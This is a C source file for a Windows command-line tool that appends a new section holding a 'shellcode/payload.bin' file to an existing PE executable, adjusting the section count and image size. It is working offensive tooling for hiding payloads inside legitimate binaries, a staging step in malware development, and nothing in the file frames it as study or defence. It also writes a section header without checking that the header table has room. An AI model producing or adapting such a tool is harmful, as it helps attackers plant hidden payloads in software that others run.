#include <Windows.h>
#include <stdio.h>

#define FILE_ALIGNMENT	 0x200
#define P2ALIGNUP(size, align) ((((size) / (align)) + 1) * (align))

int main(int argc, char* argv[]) {
    if (argc != 7 || strcmp(argv[1], "-e") != 0 || strcmp(argv[3], "-p") != 0 || strcmp(argv[5], "-s") != 0) {
        printf("[!] Usage: \"%s\" -e <PE> -p <shellcode/payload.bin> -s <new section name>\n", argv[0]);
        return -1;
    }

    printf("######### 'BreakPoint' ########\n");
    getchar();

    PBYTE pShellcode;
    SIZE_T stShellcode;
    if (!ReadFileFromDisk(argv[4], &pShellcode, &stShellcode)) {
        return -1;
    }

    LPCSTR PeName = argv[2];
    HANDLE hPE = CreateFileA(PeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hPE == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileA for PE file failed with error: %lu\n", GetLastError());
        return -1;
    }

    HANDLE hMapFile;
    LPVOID pPE;
    if (!MapView(hPE, PeName, &hMapFile, &pPE, stShellcode)) {
        goto _CLEANUP;
        return -1;
    }

    if (!InsertCustomSection(pPE, argv[6], (PVOID)pShellcode, stShellcode)) {
        goto _CLEANUP;
        return -1;
    }

_CLEANUP:
    UnmapViewOfFile(pPE);
    CloseHandle(hMapFile);
    CloseHandle(hPE);
    return 0;
}


BOOL MapView(HANDLE hPE, LPCSTR PeName,PHANDLE hMapFile, LPVOID* pImage, SIZE_T SctSize) {
    DWORD PreSize = GetFileSize(hPE, NULL);
	
	printf("[*] Reading, Mapping and change size at \"%s\"...\n", PeName);

	printf("\t[i] Original file sizeof(%d)\n", PreSize);
	printf("\t[i] Shellcode sizeof(%d)\n", SctSize);

	DWORD NewSize = P2ALIGNUP(GetFileSize(hPE, NULL) + SctSize, FILE_ALIGNMENT);
	printf("\t[*] File sizeof(%d) after alignment at %s\n", NewSize,PeName);

    *hMapFile = CreateFileMappingA(hPE, NULL, PAGE_READWRITE, 0, NewSize, NULL);
    if (*hMapFile == NULL) {
        printf("\t[!] CreateFileMapping failed with error: %lu\n", GetLastError());
        return FALSE;
    }
    *pImage = MapViewOfFile(*hMapFile, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
    if (*pImage == NULL) {
        printf("\t[!] MapViewOfFile failed with error: %lu\n", GetLastError());
        CloseHandle(*hMapFile);
        return FALSE;
    }
	printf("\t[*] Mapped memory for PE at 0x%p\n\n", pImage);

    return TRUE;
}

BOOL UnMapView(HANDLE hMapFile, LPVOID pImage) {
    if (!UnmapViewOfFile(pImage)) {
        printf("[!] Error UnMapView: %lu\n", GetLastError());
        return FALSE;
    }

    if (!CloseHandle(hMapFile)) {
        printf("[!] Error CloseHandle: %lu\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL InsertCustomSection(LPVOID pPE, LPCSTR SctName, PVOID SctData, ULONG SctSize) {
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pPE;
    PIMAGE_NT_HEADERS pImgNtHdr = (PIMAGE_NT_HEADERS)((BYTE*)pPE + pImgDosHdr->e_lfanew);
    PIMAGE_SECTION_HEADER pFirstSctHdr = IMAGE_FIRST_SECTION(pImgNtHdr);
    ULONG NumOfSct = pImgNtHdr->FileHeader.NumberOfSections;

	PIMAGE_SECTION_HEADER ScPayload = &pFirstSctHdr[NumOfSct];
	PIMAGE_SECTION_HEADER ScLastHdr = &pFirstSctHdr[NumOfSct - 1];

    ZeroMemory(ScPayload, sizeof(IMAGE_SECTION_HEADER));
	
	memcpy(&ScPayload->Name, SctName, 8);
	printf("[*] Starting insert new section in PE file...\n");

	ScPayload->Misc.VirtualSize = SctSize;
	ScPayload->VirtualAddress	= P2ALIGNUP((ScLastHdr->VirtualAddress + ScLastHdr->Misc.VirtualSize), pImgNtHdr->OptionalHeader.SectionAlignment);
	ScPayload->SizeOfRawData	= P2ALIGNUP(SctSize, pImgNtHdr->OptionalHeader.FileAlignment);
	ScPayload->PointerToRawData = ScLastHdr->PointerToRawData + ScLastHdr->SizeOfRawData;
	ScPayload->Characteristics	= IMAGE_SCN_MEM_READ;

	memcpy((PBYTE)pPE + ScPayload->PointerToRawData, SctData, SctSize );

    printf("\t[i] Number Of Sections before change %d\n", pImgNtHdr->FileHeader.NumberOfSections);

	pImgNtHdr->FileHeader.NumberOfSections++;

    printf("\t[i] Number Of Sections after change %d\n", pImgNtHdr->FileHeader.NumberOfSections);

	pImgNtHdr->OptionalHeader.SizeOfImage = ScPayload->VirtualAddress + P2ALIGNUP(SctSize, pImgNtHdr->OptionalHeader.SectionAlignment);

	return TRUE;
}

BOOL ReadFileFromDisk(LPCSTR lpFileName, PBYTE* pFile, SIZE_T* sFile) {

	HANDLE	hFile = INVALID_HANDLE_VALUE;
	PBYTE	pBuff = NULL;
	DWORD	dwFileSize = NULL,
		dwNumberOfBytesRead = NULL;

	printf("[i] Reading \"%s\"...\n", lpFileName);

	hFile = CreateFileA(lpFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("\t[!] CreateFileA for binary file Failed With Error : %d \n", GetLastError());
		goto _CLEANUP;
	}

	printf("\t[*] CreateFile for binary file Successfully\n");

	dwFileSize = GetFileSize(hFile, NULL);
	if (dwFileSize == NULL) {
		printf("\t[!] GetFileSize for binary file Failed With Error : %d \n", GetLastError());
		goto _CLEANUP;
	}

	pBuff = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
	if (pBuff == NULL) {
		printf("\t[!] HeapAlloc for binary file Failed With Error : %d \n", GetLastError());
		goto _CLEANUP;
	}

	printf("\t[*] Allocated buffer of binary file at: 0x%p\n\n", pBuff);

	if (!ReadFile(hFile, pBuff, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		printf("\t[!] ReadFile for binary file Failed With Error : %d \n", GetLastError());
		printf("\t[!] Bytes Read for binary file: %d of : %d \n\n", dwNumberOfBytesRead, dwFileSize);
		goto _CLEANUP;
	}


_CLEANUP:
	*pFile = (PBYTE)pBuff;
	*sFile = (SIZE_T)dwFileSize;
	if (hFile)
		CloseHandle(hFile);
	if (*pFile == NULL || *sFile == NULL)
		return FALSE;
	return TRUE;
}

